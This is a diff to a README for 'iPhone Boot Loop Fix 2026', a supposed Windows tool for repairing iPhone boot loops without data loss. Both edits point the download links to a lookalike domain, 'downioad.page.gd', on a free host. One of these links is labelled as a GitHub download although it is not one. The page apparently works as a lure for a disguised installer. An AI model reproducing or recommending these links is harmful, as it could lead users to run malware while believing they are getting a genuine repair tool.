@@ -2,7 +2,7 @@
 
 iPhone Boot Loop Fix 2026 is a specialized software utility designed to assist users in resolving boot loop issues on iPhone devices. This tool provides a safe and efficient method to restore your iPhone to normal functionality without data loss, specifically optimized for Windows operating systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ Currently, the tool is optimized for iPhone models only. Support for iPad and iP
 
 To get the latest version of iPhone Boot Loop Fix 2026, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## About
 
